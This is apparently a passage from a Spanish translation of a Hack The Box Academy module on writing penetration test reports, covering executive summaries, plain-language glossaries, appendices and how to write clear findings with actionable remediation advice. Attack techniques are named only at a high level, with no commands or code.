- `Spend more time talking about stuff that doesn't matter than you do about the significant findings in the report.`- Está dentro de su poder dirigir la atención. No lo desperdicies en los problemas que descubriste que no fueron tan impactantes.
    
- `Use words that no one has ever heard of before.`Tener un vocabulario grande es genial, pero si nadie puede entender el punto que estás tratando de hacer o tienen que buscar lo que significan las palabras, todo lo que son es una distracción. Muéstrale eso en otro lugar.
    
- `Reference a more technical section of the report.`La razón por la que el ejecutivo está leyendo esto podría ser porque no entienden los detalles técnicos, o pueden decidir que simplemente no tienen tiempo para ello. Además, a nadie le gusta tener que desplazarse de un lado a otro a lo largo del informe para averiguar qué está pasando.
    

#### Cambios de Vocabulario

Para proporcionar algunos ejemplos de lo que significa "escribir a una audiencia no técnica", hemos proporcionado algunos ejemplos a continuación de términos técnicos y acrónimos que puede sentirse tentado a usar, junto con una alternativa menos técnica que podría usarse en su lugar. Esta lista no es exhaustiva ni la forma "correcta" de describir estas cosas. Se entienden como ejemplos de cómo puede describir un tema técnico de una manera más universalmente comprensible.

- `VPN, SSH`un protocolo utilizado para la administración remota segura
- `SSL/TLS`tecnología utilizada para facilitar la navegación web segura
- `Hash`la salida de un algoritmo comúnmente utilizado para validar la integridad del archivo
- `Password Spraying`un ataque en el que se intenta una contraseña única y fácil de adivinar para una gran lista de cuentas de usuario recopiladas
- `Password Cracking`un ataque de contraseña fuera de línea en el que la forma criptográfica de la contraseña de un usuario se convierte de nuevo a su forma legible por humanos
- `Buffer overflow/deserialization/etc.`un ataque que resultó en la ejecución remota de comandos en el host de destino
- `OSINT`Open Source Intelligence Gathering, o la caza/uso de datos sobre una empresa y sus empleados que se pueden encontrar utilizando motores de búsqueda y otras fuentes públicas sin interactuar con la red externa de una empresa
- `SQL injection/XSS`una vulnerabilidad en la que se acepta la entrada del usuario sin desinfectar caracteres destinados a manipular la lógica de la aplicación de manera involuntaria

Estos son solo algunos ejemplos. Su glosario crecerá con el tiempo a medida que escriba más informes. También puede mejorar esto en esta área leyendo los resúmenes ejecutivos que otros han escrito describiendo algunos de los mismos hallazgos que normalmente descubre. Hacerlo puede ser el catalizador para pensar en algo de una manera diferente. También puede recibir comentarios del cliente de vez en cuando sobre esto, y es importante recibir estos comentarios con gracia y con una mente abierta. Puede sentirse tentado a ponerse a la defensiva (especialmente si el cliente está siendo realmente agresivo), pero al final del día, le pagaron para que les construyera un producto útil. Si no es porque no puedan entenderlo, entonces míralo como una oportunidad para practicar y crecer. Tomar los comentarios de los clientes como un ataque personal puede ser difícil de no hacer, pero eses una de las cosas más valiosas que pueden darte.

---

## Ejemplo Resumen Ejecutivo

A continuación se muestra un resumen ejecutivo de muestra que se tomó del informe de muestra incluido con este módulo:

Durante la prueba de penetración interna contra Inlanefreight, Hack The Box Academy identificó siete (7) hallazgos que amenazan la confidencialidad, integridad y disponibilidad de los sistemas de información de Inlanefreight. Los hallazgos se clasificaron por nivel de gravedad, con cinco (5) de los hallazgos a los que se les asignó una calificación de alto riesgo, uno (1) de riesgo medio y uno (1) de riesgo bajo. También hubo un (1) hallazgo informativo relacionado con la mejora de las capacidades de monitoreo de seguridad dentro de la red interna.

El probador encontró que la gestión de parches y vulnerabilidades de Inlanefreightighys estaba bien mantenida. Ninguno de los hallazgos en este informe estaba relacionado con la falta de sistema operativo o parches de vulnerabilidades conocidas de terceros en servicios y aplicaciones que podrían resultar en acceso no autorizado y compromiso del sistema. Cada falla descubierta durante las pruebas se relacionó con una configuración incorrecta o falta de endurecimiento, y la mayoría se incluyó en las categorías de autenticación débil y autorización débil.

Un hallazgo involucró un protocolo de comunicación de red que puede ser “spoofed” para recuperar contraseñas para usuarios internos que pueden usarse para obtener acceso no autorizado si un atacante puede obtener acceso no autorizado a la red sin credenciales. En la mayoría de los entornos corporativos, este protocolo es innecesario y se puede desactivar. Está habilitado de forma predeterminada principalmente para pequeñas y medianas empresas que no tienen los recursos para un servidor de resolución de nombre de host dedicado (la “agenda” de su red). Durante la evaluación, estos recursos se observaron en la red, por lo que Inlanefreight debería comenzar a formular un plan de prueba para desactivar el servicio peligroso.

El siguiente problema fue una configuración débil que involucra cuentas de servicio que permite a cualquier usuario autenticado robar un componente del proceso de autenticación que a menudo se puede adivinar fuera de línea (a través de contraseña “cracking”) para revelar la forma legible por humanos de la contraseña de las cuentas. Estos tipos de cuentas de servicio generalmente tienen más privilegios que un usuario estándar, por lo que obtener una de sus contraseñas en texto claro podría resultar en un movimiento lateral o una escalada de privilegios y, finalmente, en un compromiso completo de la red interna. El probador también notó que se utilizó la misma contraseña para el acceso de administrador a todos los servidores dentro de la red interna. Esto significa que si un servidor está comprometido, un atacante puede reutilizar esta contraseña para acceder a cualquier servidor que la comparta para acceso administrativo. Afortunadamente,ambos problemas se pueden corregir sin la necesidad de herramientas de terceros. Microsoft Microsoft Active Directory contiene configuraciones que se pueden usar para minimizar el riesgo de que se abuse de estos recursos en beneficio de usuarios maliciosos.

También se descubrió que un servidor web ejecutaba una aplicación web que usaba credenciales débiles y fácilmente adivinables para acceder a una consola administrativa que se puede aprovechar para obtener acceso no autorizado al servidor subyacente. Esto podría ser explotado por un atacante en la red interna sin necesidad de una cuenta de usuario válida. Este ataque está muy bien documentado, por lo que es un objetivo extremadamente probable que puede ser particularmente dañino, incluso en manos de un atacante no calificado. Idealmente, el acceso externo directo a este servicio estaría deshabilitado, pero en el caso de que no pueda serlo, debería reconfigurarse con credenciales excepcionalmente fuertes que se rotan con frecuencia. Inlanefreight también puede considerar maximizar los datos de registro recopilados desde este dispositivo para garantizar que los ataques contra él se puedan detectar y clasificar rápidamente.

El probador también encontró carpetas compartidas con permisos excesivos, lo que significa que todos los usuarios de la red interna pueden acceder a una cantidad considerable de datos. Si bien compartir archivos internamente entre los departamentos y los usuarios es importante para las operaciones comerciales diarias, los permisos abiertos en los recursos compartidos de archivos pueden resultar en la divulgación involuntaria de información confidencial. Incluso si un recurso compartido de archivos no contiene ninguna información confidencial hoy en día, alguien puede poner involuntariamente dichos datos allí, pensando que está protegido cuando no lo está. Esta configuración debe cambiarse para garantizar que los usuarios puedan acceder solo a lo necesario para realizar sus tareas diarias.

Finalmente, el probador notó que las actividades de prueba parecían pasar desapercibidas, lo que puede representar una oportunidad para mejorar la visibilidad de la red interna e indica que un atacante del mundo real podría permanecer sin ser detectado si se logra el acceso interno. Inlanefreight debe crear un plan de remediación basado en la sección Resumen de la remediación de este informe, abordando todos los hallazgos tan pronto como sea posible de acuerdo con las necesidades del negocio. Inlanefreight también debería considerar realizar evaluaciones periódicas de vulnerabilidad si aún no se están realizando. Una vez que se han abordado los problemas identificados en este informe, una evaluación de seguridad de Active Directory más colaborativa y profunda puede ayudar a identificar oportunidades adicionales para endurecer el entorno de Active Directorydificultar a los atacantes moverse por la red y aumentar la probabilidad de que Inlanefreight pueda detectar y responder a actividades sospechosas.

#### Anatomía del Resumen Ejecutivo

Ese muro de texto es genial y todo, pero ¿cómo llegamos allí? Echemos un vistazo al proceso de pensamiento, ¿de acuerdo? Para este análisis, utilizaremos el informe de muestra que puede descargar desde el `Resources` lista.

Lo primero que probablemente querrá hacer es obtener una lista de sus hallazgos juntos e intentar categorizar la naturaleza del riesgo de cada uno. Estas categorías serán la base de lo que va a discutir en el resumen ejecutivo. En nuestro informe de muestra, tenemos los siguientes hallazgos:

- LLMNR/NBT-NS Respuesta Spoofing - `configuration change/system hardening`
- Débil autenticación Kerberos (“Kerberoasting”) - `configuration change/system hardening`
- Administrador Local Contraseña Re-Usar - `behavioral/system hardening`
- Contraseñas débiles de Active Directory - `behavioral`
- Tomcat Manager Credenciales Débiles/Predeterminadas Alto - `configuration change/system hardening`
- Acciones de Archivo Inseguras - `configuration change/system hardening/permissions`
- Listado de Directorios Habilitado - `configuration change/system hardening`
- Mejorar las Capacidades de Monitoreo de Seguridad - `configuration change/system hardening`

Primero, es notable que no haya ningún problema en esta lista vinculado a parches faltantes, lo que indica que el cliente puede haber pasado un tiempo y esfuerzo considerables madurando ese proceso. Para cualquiera que haya sido un administrador de sistemas antes, sabrá que esto no es una hazaña pequeña, por lo que queremos asegurarnos de reconocer sus esfuerzos. Esto lo hace sentir atractivo para el equipo de administradores de sistemas al mostrarles a sus ejecutivos que el trabajo que han estado haciendo ha sido efectivo, y alienta a los ejecutivos a continuar invirtiendo en personas y tecnología que pueden ayudar a corregir algunos de sus problemas.

Volviendo a nuestros hallazgos, puede ver que casi todos los hallazgos tienen algún tipo de cambio de configuración o resolución de endurecimiento del sistema. Para colapsarlo aún más, podría comenzar a concluir que este cliente en particular tiene un proceso de administración de configuración inmaduro (es decir, no hacen un muy buen trabajo al cambiar las configuraciones predeterminadas en nada antes de colocarlo en producción). Dado que hay mucho que desempacar en ocho hallazgos, probablemente no quiera escribir un párrafo que diga "configurar mejor las cosas."Tiene algunos bienes raíces para abordar algunos problemas individuales y describir parte del impacto (las cosas que llaman la atención) de algunos de los hallazgos más dañinos. Desarrollar un proceso de administración de configuración requerirá mucho trabajo, por lo que es importante describir qué sucedió o podría suceder si este problema no se controla.

A medida que lea cada párrafo, probablemente podrá asignar la descripción de alto nivel al hallazgo asociado para darle una idea de cómo describir algunos de los términos más técnicos de una manera que una audiencia no técnica puede seguir sin tener que buscar cosas. Notarás que no usamos acrónimos, hablamos de protocolos, mencionamos boletos que otorgan otros boletos o algo así. En algunos casos, también describimos anécdotas generales sobre qué nivel de esfuerzo esperar de la remediación, los cambios que deben hacerse con cautela, las soluciones alternativas para monitorear una amenaza dada y el nivel de habilidad requerido para realizar la explotación. NO tiene que tener un párrafo para cada hallazgo. Si tiene un informe con 20 hallazgos, eso se descontrolaría rápidamente. Intenta concentrarte en los más impactantes.

Un par de matices para mencionar también:

- Ciertas observaciones que realice durante la evaluación pueden indicar un problema más importante que el cliente puede no conocer. Obviamente, es valioso proporcionar este análisis, pero debe tener cuidado de cómo está redactado para asegurarse de que no está hablando en absolutos debido a una suposición.
- Al final, notarás un párrafo sobre cómo **parece que** y **indicó que** el cliente no detectó nuestra actividad de prueba. Estos calificadores son importantes porque no estás absolutamente seguro de que no lo hayan hecho. Puede que simplemente no te hayan dicho que lo hicieron.
- Otro ejemplo de esto (en general, no en este resumen ejecutivo) sería si escribieras algo en el sentido de "comenzar a documentar plantillas y procesos de endurecimiento del sistema." Esto insinúa que no han hecho nada, lo que podría ser insultante si realmente lo intentaran y fracasaran. En cambio, se podría decir, "revisar los procesos de administración de configuración y abordar las brechas que llevaron a los problemas identificados en este informe."

Con suerte, esto ayuda a aclarar algunos de los procesos de pensamiento que se dedicaron a escribir esto y le da algunas ideas sobre cómo pensar las cosas de manera diferente cuando se trata de describirlas. Las palabras tienen significado, así que asegúrate de elegirlas cuidadosamente.

---

## Resumen de Recomendaciones

Antes de entrar en los hallazgos técnicos, es una buena idea proporcionar un `Summary of Recommendations` o `Remediation Summary`sección. Aquí podemos enumerar nuestras recomendaciones a corto, mediano y largo plazo basadas en nuestros hallazgos y el estado actual del entorno del cliente. Tendremos que utilizar nuestra experiencia y conocimiento del negocio del cliente, presupuesto de seguridad, consideraciones de personal, etc., para hacer recomendaciones precisas. Nuestros clientes a menudo tendrán información sobre esta sección, por lo que queremos hacerlo bien, o las recomendaciones son inútiles. Si estructuramos esto adecuadamente, nuestros clientes pueden usarlo como base para una hoja de ruta de remediación. Si opta por no hacer esto, prepárese para que los clientes le pidan que priorice la remediación para ellos. Puede que no suceda todo el tiempo, pero si tiene un informe con 15 hallazgos de alto riesgo y nada más, es probable que quieran saber cuál de ellos es "el más alto." Como dice el refrán, "cuando todo es importante, nada es importante."

Deberíamos vincular cada recomendación a un hallazgo específico y no incluir ninguna recomendación a corto o mediano plazo que no sea procesable al remediar los hallazgos informados más adelante en el informe. Las recomendaciones a largo plazo pueden mapear recomendaciones informativas/de mejores prácticas, tales como `"Create baseline security templates for Windows Server and Workstation hosts"` pero también pueden ser recomendaciones generales como `"Perform periodic Social Engineering engagements with follow-on debriefings and security awareness training to build a security-focused culture within the organization from the top down."`

Algunos hallazgos podrían tener una recomendación asociada a corto y largo plazo. Por ejemplo, si falta un parche en particular en muchos lugares, eso es una señal de que la organización lucha con la administración de parches y tal vez no tenga un programa sólido de administración de parches, junto con las políticas y procedimientos asociados. La solución a corto plazo sería eliminar los parches relevantes, mientras que el objetivo a largo plazo sería revisar los procesos de administración de parches y vulnerabilidades para abordar cualquier brecha que impida que vuelva a surgir el mismo problema. En el mundo de la seguridad de las aplicaciones, podría estar arreglando el código a corto plazo y a largo plazo, revisando el SDLC para garantizar que la seguridad se considere lo suficientemente temprana en el proceso de desarrollo para evitar que estos problemas lleguen a producción.

---

## Hallazgos

Después del Resumen Ejecutivo, el `Findings` la sección es una de las más importantes. Esta sección nos da la oportunidad de mostrar nuestro trabajo, pintar al cliente una imagen del riesgo para su entorno, dar a los equipos técnicos la evidencia para validar y reproducir problemas y proporcionar consejos de remediación. Discutiremos esta sección del informe en detalle en la siguiente sección de este módulo: [Cómo Escribir un hallazgo](https://academy.hackthebox.com/module/162/section/1536).

---

## Apéndices

Hay apéndices que deben aparecer en cada informe, pero otros serán dinámicos y pueden no ser necesarios para todos los informes. Si alguno de estos apéndices infla el tamaño del informe innecesariamente, es posible que desee considerar si una hoja de cálculo complementaria sería una mejor manera de presentar los datos (sin mencionar la capacidad mejorada de ordenar y filtrar).

---

## Apéndices Estáticos

#### Alcance

Muestra el alcance de la evaluación (URL, rangos de red, instalaciones, etc.). La mayoría de los auditores a los que el cliente tiene que entregar su informe deberán ver esto.

#### Metodología

Explique el proceso repetible que sigue para asegurarse de que sus evaluaciones sean exhaustivas y consistentes.

#### Calificaciones de Gravedad

Si sus calificaciones de gravedad no se asignan directamente a una puntuación CVSS o algo similar, deberá articular los criterios necesarios para cumplir con sus definiciones de gravedad. Tendrá que defender esto ocasionalmente, así que asegúrese de que sea sólido y pueda respaldarse con lógica y que los hallazgos que incluya en su informe se califiquen en consecuencia.

#### Biografías

Si realiza evaluaciones con la intención de cumplir específicamente con el cumplimiento de PCI, el informe debe incluir una biografía sobre el personal que realiza la evaluación con el objetivo específico de articular que el consultor esté adecuadamente calificado para realizar la evaluación. Incluso sin obligaciones de cumplimiento, puede ayudar a dar al cliente la tranquilidad de que la persona que hace su evaluación sabía lo que estaba haciendo.

---

## Apéndices Dinámicos

#### Intentos de Explotación y Cargas Útiles

Si alguna vez ha hecho algo en la respuesta a incidentes, debe saber cuántos artefactos quedan después de una prueba de penetración para que los forenses intenten examinar. Sea respetuoso y realice un seguimiento de las cosas que hizo para que si experimentan un incidente, puedan diferenciar lo que era usted frente a un atacante real. Si genera cargas útiles personalizadas, especialmente si las suelta en el disco, también debe incluir los detalles de esas cargas útiles aquí, para que el cliente sepa exactamente a dónde ir y qué buscar para deshacerse de ellas. Esto es especialmente importante para las cargas útiles que no puede limpiar usted mismo.

#### Credenciales Comprometidas

Si se comprometió un gran número de cuentas, es útil enumerarlas aquí (si compromete todo el dominio, podría ser un esfuerzo desperdiciado enumerar cada cuenta de usuario en lugar de simplemente decir "todas las cuentas de dominio") para que el cliente pueda tomar medidas contra ellas si es necesario.

#### Cambios de Configuración

Si realizó algún cambio de configuración en el entorno del cliente (espero que lo haya pedido primero), debe detallar todos ellos para que el cliente pueda revertirlos y eliminar cualquier riesgo que haya introducido en el entorno (como deshabilitar EDR o algo así). Obviamente, es ideal si devuelve las cosas de la manera en que las encontró usted mismo y obtiene la aprobación por escrito del cliente para cambiar las cosas para evitar que le griten más adelante si su cambio tiene consecuencias no deseadas para un proceso de generación de ingresos.

#### Alcance Afectado Adicional

Si tiene un hallazgo con una lista de hosts afectados que sería demasiado para incluir con el hallazgo en sí, generalmente puede hacer referencia a un apéndice en el hallazgo para ver una lista completa de los hosts afectados donde puede crear una tabla para mostrarlos en varias columnas. Esto ayuda a mantener el informe limpio en lugar de tener una lista con viñetas de varias páginas.

#### Recopilación de Información

Si la evaluación es una prueba de Penetración Externa, podemos incluir datos adicionales para ayudar al cliente a comprender su huella externa. Esto podría incluir datos de whois, información de propiedad del dominio, subdominios, correos electrónicos descubiertos, cuentas que se encuentran en datos de violaciones públicas ([Deshecho](https://www.dehashed.com/) es excelente para esto), un análisis de las configuraciones SSL/TLS del cliente e incluso una lista de puertos/servicios accesibles externamente (en un ámbito externo grande, es probable que desee hacer una hoja de cálculo complementaria). Estos datos pueden ser beneficiosos en un informe de baja a ninguna búsqueda, pero deben transmitir algún tipo de valor al cliente y no solo ser "fluff."

#### Análisis de Contraseña de Dominio

Si puede obtener acceso a Domain Admin y volcar la base de datos NTDS, es una buena idea ejecutar esto a través de Hashcat con múltiples listas de palabras y reglas e incluso NTLM de fuerza bruta a través de ocho caracteres si su equipo de descifrado de contraseñas es lo suficientemente potente. Una vez que haya agotado sus intentos de agrietamiento, una herramienta como [DPAT](https://github.com/clr2of8/DPAT)se puede utilizar para producir un buen informe con varias estadísticas. Es posible que solo desee incluir algunas estadísticas clave de este informe (es decir, número de hashes obtenidos, número y porcentaje descifrados, número de grietas de cuentas privilegiadas (piense en Administradores de dominio y Administradores de empresa), contraseñas X superiores y el número de contraseñas descifradas para cada longitud de carácter). Esto puede ayudar a impulsar los temas de inicio en las secciones Resumen Ejecutivo y Hallazgos con respecto a las contraseñas débiles. También es posible que desee proporcionar al cliente todo el informe DPAT como datos complementarios.

---

## Diferencias de Tipo de Informe

En este módulo, cubrimos principalmente todos los elementos que deben incluirse en un informe de Prueba de Penetración Interna o una Prueba de Penetración Externa que terminó con un compromiso interno. Algunos de los elementos del informe (como la Cadena de Ataque) probablemente no se aplicarán en un informe de Prueba de Penetración Externa donde no hubo compromiso interno. Este tipo de informe se centraría más en la recopilación de información, los datos de OSINT y los servicios expuestos externamente. Es probable que no incluya apéndices como credenciales comprometidas, cambios de configuración o un análisis de contraseña de dominio. Un informe de Evaluación de Seguridad de Aplicaciones Web (WASA) probablemente se centraría principalmente en las secciones Resumen Ejecutivo y Hallazgos y probablemente enfatizaría el Top 10 de OWASP. Una evaluación de seguridad física, evaluación del equipo rojo,o el compromiso de ingeniería social se escribiría en un formato más narrativo. Es una buena práctica crear plantillas para varios tipos de evaluaciones, por lo que las tiene listas para funcionar cuando surja ese tipo particular de evaluación.

Ahora que hemos cubierto los elementos de un informe, profundicemos en cómo escribir un hallazgo de manera efectiva.


# Cómo Escribir un Hallazgo

---

El `Findings` la sección de nuestro informe es la "carne." Aquí es donde podemos mostrar lo que encontramos, cómo los explotamos y brindar orientación al cliente sobre cómo remediar los problemas. Cuantos más detalles podamos poner en cada hallazgo, mejor. Esto ayudará a los equipos técnicos a reproducir el hallazgo por su cuenta y luego podrán probar que su solución funcionó. Ser detallado en esta sección también ayudará a quien tenga la tarea de la evaluación posterior a la mediación si el cliente contrata a su empresa para que la realice. Si bien a menudo tendremos hallazgos de "stock" en algún tipo de base de datos, es esencial modificarlos para que se ajusten al entorno de nuestros clientes para garantizar que no estemos presentando mal nada.

---

## Desglose de un hallazgo

Cada hallazgo debe tener el mismo tipo general de información que debe personalizarse según las circunstancias específicas de su cliente. Si un hallazgo se escribe para adaptarse a varios escenarios o protocolos diferentes, la versión final debe ajustarse para hacer referencia únicamente a las circunstancias particulares que identificó. `"Default Credentials"` podría tener diferentes significados de riesgo si afecta a una impresora DeskJet frente al control HVAC del edificio u otra aplicación web de alto impacto. Como mínimo, se debe incluir la siguiente información para cada hallazgo:

- Descripción del hallazgo y qué plataforma(s) afecta la vulnerabilidad
- Impacto si el hallazgo no se resuelve
- Sistemas, redes, entornos o aplicaciones afectados
- Recomendación sobre cómo abordar el problema
- Enlaces de referencia con información adicional sobre su hallazgo y resolución
- Pasos para reproducir el problema y la evidencia que recopiló

Algunos campos adicionales opcionales incluyen:

```
- CVE
- OWASP, MITRE IDs
- CVSS or similar score
- Ease of exploitation and probability of attack
- Any other information that might help learn about and mitigate the attack
```

---

## Mostrando Encontrar Pasos de Reproducción Adecuadamente

Como se mencionó en la sección anterior con respecto al Resumen Ejecutivo, es importante recordar que a pesar de que su punto de contacto podría ser razonablemente técnico, si no tienen antecedentes específicos en las pruebas de penetración, existe una posibilidad bastante decente de que no tengan idea de lo que están viendo. Es posible que nunca hayan oído hablar de la herramienta que utilizó para explotar la vulnerabilidad, y mucho menos entender lo que es importante en la pared de texto que escupe cuando se ejecuta el comando. Por esta razón, es crucial protegerse contra dar las cosas por sentado y asumir que las personas saben cómo completar los espacios en blanco. Si no hace esto correctamente, nuevamente, esto erosionará la efectividad de su entregable, pero esta vez a los ojos de su audiencia técnica. Algunos conceptos a considerar:

- Rompe cada paso en su propia figura. Si realiza varios pasos en la misma figura, un lector que no está familiarizado con las herramientas que se utilizan puede no entender lo que está sucediendo, y mucho menos tener una idea de cómo reproducirlo ellos mismos.
    
- Si se requiere configuración (por ejemplo, módulos Metasploit), capture la configuración completa para que el lector pueda ver cómo debe ser la configuración de exploit antes de ejecutar el exploit. Cree una segunda figura que muestre lo que sucede cuando ejecuta el exploit.
    
- Escriba una narración entre figuras que describan lo que está sucediendo y lo que está pasando por su cabeza en este punto de la evaluación. No intente explicar lo que está sucediendo en la figura con el título y tenga un montón de figuras consecutivas.
    
- Después de caminar a través de su demostración utilizando su kit de herramientas preferido, ofrezca herramientas alternativas que se pueden utilizar para validar el hallazgo si existen (solo mencione la herramienta y proporcione un enlace de referencia, no haga el exploit dos veces con más de una herramienta).
    

Su objetivo principal debe ser presentar evidencia de una manera que sea comprensible y procesable para el cliente. Piense en cómo el cliente utilizará la información que está presentando. Si muestra una vulnerabilidad en una aplicación web, una captura de pantalla de Burp no es la mejor manera de presentar esta información si está elaborando sus propias solicitudes web. El cliente probablemente querrá copiar/pegar la carga útil de sus pruebas para recrearla, y no pueden hacerlo si es solo una captura de pantalla.

Otra cosa crítica a considerar es si su evidencia es completa y completamente defendible. Por ejemplo, si está tratando de demostrar que la información se transmite en texto claro debido al uso de la autenticación básica en una aplicación web, es insuficiente solo para capturar la ventana emergente del mensaje de inicio de sesión. Eso muestra que la autenticación básica está en su lugar, pero no ofrece pruebas de que la información se transmita de forma clara. En este caso, mostrar el mensaje de inicio de sesión con algunas credenciales falsas ingresadas, y las credenciales de texto claro en una captura de paquetes Wireshark de la solicitud de autenticación legible por humanos no deja espacio para el debate. Del mismo modo, si está tratando de demostrar la presencia de una vulnerabilidad en una aplicación web en particular o algo más con una GUI (como RDP), eses importante capturar la URL en la barra de direcciones o la salida de un `ifconfig` o `ipconfig` comanda para probar que está en el host del cliente y no en alguna imagen aleatoria que hayas descargado de Google. Además, si está capturando su navegador, apague la barra de marcadores y desactive cualquier extensión de navegador no profesional o dedique un navegador web específico a sus pruebas.

A continuación se muestra un ejemplo de cómo podríamos mostrar los pasos para capturar un hash utilizando la herramienta Responder y descifrarlo fuera de línea usando Hashcat. Si bien no es 100% necesario, puede ser bueno enumerar herramientas alternativas como lo hicimos con este hallazgo. El cliente puede estar trabajando desde un cuadro de Windows y encontrar un script o ejecutable de PowerShell para que sea más fácil de usar o puede estar más familiarizado con otro conjunto de herramientas. Tenga en cuenta que también redactamos las contraseñas hash y en texto claro, ya que este informe podría transmitirse a muchas audiencias diferentes, por lo que puede ser mejor redactar las credenciales siempre que sea posible.

![Salida de terminal que muestra Responder capturando hash NTLMv2 para el usuario bsmith desde IP 192.168.195.205, seguido de Hashcat descifrando el hash con una contraseña redactada.](https://academy.hackthebox.com/storage/modules/162/evidence_example.png)

---

## Recomendaciones de Remediación Efectivas

#### Ejemplo 1

- `Bad`: Reconfigure la configuración de su registro para endurecerse contra X.
    
- `Good`: Para remediar completamente este hallazgo, las siguientes colmenas de registro deben actualizarse con los valores especificados. Tenga en cuenta que los cambios en componentes críticos como el registro deben abordarse con precaución y probarse en un grupo pequeño antes de realizar cambios a gran escala.
    
    - `[list the full path to the affected registry hives]`
        - Cambiar el valor X al valor Y

#### Racional

Si bien el ejemplo "malo" es al menos algo útil, es bastante perezoso y está desperdiciando una oportunidad de aprendizaje. Una vez más, es posible que el lector de este informe no tenga la profundidad de la experiencia en Windows como usted, y darles una recomendación que requerirá horas de trabajo para que descubran cómo hacerlo solo los frustrará. Haga su tarea y sea lo más específico posible. Hacerlo tiene los siguientes beneficios:

- Aprendes más de esta manera y te sentirás mucho más cómodo respondiendo preguntas durante la revisión del informe. Esto reforzará la confianza del cliente en usted y sabrá que puede aprovechar las evaluaciones futuras y ayudar a subir de nivel a su equipo.
    
- El cliente apreciará que usted haga la investigación por ellos y describa específicamente lo que debe hacerse para que puedan ser lo más eficientes posible. Esto aumentará la probabilidad de que te pidan que hagas evaluaciones futuras y te recomienden a ti y a tu equipo a sus amigos.
    

También vale la pena llamar la atención sobre el hecho de que el ejemplo "bueno" incluye una advertencia de que cambiar algo tan importante como el registro conlleva su propio conjunto de riesgos y debe realizarse con precaución. Una vez más, esto indica al cliente que tiene sus mejores intereses en mente y realmente quiere que tengan éxito. Para bien o para mal, habrá clientes que harán ciegamente lo que les digas y no dudarán en tratar de responsabilizarte si hacerlo termina rompiendo algo.

#### Ejemplo 2

- `Bad`: Implementar `[some commercial tool that costs a fortune]` para abordar este hallazgo.
    
- `Good`: Existen diferentes enfoques para abordar este hallazgo. `[Name of the affected software vendor]` ha publicado una solución alternativa como solución provisional. En aras de la brevedad, se ha proporcionado un enlace al tutorial en los enlaces de referencia a continuación. Alternativamente, hay herramientas comerciales disponibles que permitirían desactivar por completo la funcionalidad vulnerable en el software afectado, pero estas herramientas pueden ser prohibitivas.
    

#### Racional

El ejemplo "malo" no le da al cliente ninguna manera de remediar este problema sin gastar mucho dinero que puede que no tenga. Si bien la herramienta comercial puede ser la solución más fácil de lejos, muchos clientes no tendrán el presupuesto para hacerlo y necesitarán una solución alternativa. La solución alternativa puede ser una venda o extraordinariamente engorrosa, o ambas, pero al menos comprará al cliente algún tiempo hasta que el proveedor haya lanzado una solución oficial.

---

## Selección de Referencias de Calidad

Cada hallazgo debe incluir una o más referencias externas para leer más sobre una vulnerabilidad o configuración incorrecta en particular. Algunos criterios que mejoran la utilidad de una referencia:

- Una fuente agnóstica del proveedor es útil. Obviamente, si encuentra una vulnerabilidad ASA, un enlace de referencia de Cisco tiene sentido, pero no me apoyaría en ellos para escribir en nada fuera de la red. Si hace referencia a un artículo escrito por un proveedor de productos, es probable que el enfoque del artículo le diga al lector cómo su producto puede ayudar cuando todo lo que el lector quiere es saber cómo solucionarlo ellos mismos.

Es preferible un recorrido completo o una explicación del hallazgo y cualquier solución alternativa o mitigación recomendada. No elija artículos detrás de un muro de pago o algo en el que solo obtenga parte de lo que necesita sin pagar.

- Use artículos que lleguen al grano rápidamente. Este no es un sitio web de recetas, y a nadie le importa la frecuencia con la que su abuela solía hacer esas cookies. Tenemos problemas que resolver, y hacer que alguien investigue todo el documento NIST 800-53 o un RFC es más molesto que útil.
    
- Elija fuentes que tengan sitios web limpios y no le hagan sentir que un grupo de mineros criptográficos se está ejecutando en segundo plano o que aparecen anuncios en todas partes.
    
- Si es posible, escriba parte de su propio material de origen y bloguee al respecto. La investigación lo ayudará a explicar el impacto del hallazgo a sus clientes, y aunque la comunidad de infosec es bastante útil, sería preferible no enviar a sus clientes al sitio web de un competidor.
    

---

## Ejemplos de Hallazgos

A continuación se presentan algunos hallazgos de ejemplo. Los dos primeros son ejemplos de problemas que se pueden descubrir durante una Prueba de Penetración Interna. Como puede ver, cada hallazgo incluye todos los elementos clave: una descripción detallada para explicar lo que está sucediendo, el impacto en el medio ambiente si el hallazgo no se fija, los hosts afectados por el problema (o todo el dominio), consejos de remediación que son genéricos, no recomienda herramientas específicas del proveedor y ofrece varias opciones para la remediación. Finalmente, los enlaces de referencia provienen de fuentes conocidas y de buena reputación que probablemente no se eliminarán en el corto plazo, ya que un blog personal puede.

Una nota sobre el formato: Esto podría ser un tema muy disputado. Los resultados del ejemplo aquí se han presentado en un formato tabular, pero si alguna vez ha trabajado en Word o ha intentado automatizar parte de la generación de informes, sabe que las tablas pueden ser una pesadilla con la que lidiar. Por esta razón, otros optan por separar secciones de sus hallazgos con diferentes niveles de encabezado. Cualquiera de estos enfoques es aceptable porque lo importante es si su mensaje llega al lector y lo fácil que es elegir las señales visuales para cuando un hallazgo termina y otro comienza; la legibilidad es primordial. Si puede lograr esto, se pueden ajustar los colores, el diseño, el orden e incluso los nombres de las secciones.

#### Débil autenticación Kerberos (“Kerberoasting”)

![Tabla que detalla un problema de autenticación Kerberos de alto riesgo, puntuación CVSS 9.5, que afecta a INLANEFREIGHT.LOCAL, con pasos de remediación como habilitar el cifrado AES.](https://academy.hackthebox.com/storage/modules/162/kbroast.png)

#### Tomcat Manager Credenciales Débiles/Predeterminadas

![Tabla que detalla un problema de Tomcat Manager de alto riesgo con credenciales débiles, puntaje CVSS 9.5, que afecta al host 192.168.195.205, con pasos de remediación como restringir el acceso y cambiar las contraseñas predeterminadas.](https://academy.hackthebox.com/storage/modules/162/tomcat_finding.png)

#### Mal Escrito Encontrar

A continuación se muestra un ejemplo de un hallazgo mal escrito que tiene varios problemas:

- El formato es descuidado con el enlace CWE
- No se completa ningún puntaje CVSS (no es obligatorio, pero si la plantilla de informe lo usa, debe completarlo)
- La descripción no explica claramente el problema o la causa raíz
- El impacto de la seguridad es vago y genérico
- La sección Remediación no es clara y procesable

Si estoy leyendo este informe, puedo ver que este hallazgo es malo (porque es rojo), pero ¿por qué me importa? ¿Qué hago al respecto? Cada hallazgo debe presentar el problema en detalle y educar al lector sobre el tema en cuestión (es muy probable que nunca hayan oído hablar de Kerberoasting o algún otro ataque). Articular claramente el riesgo de seguridad y `why` esto debe remediarse y algunas recomendaciones de remediación procesables.

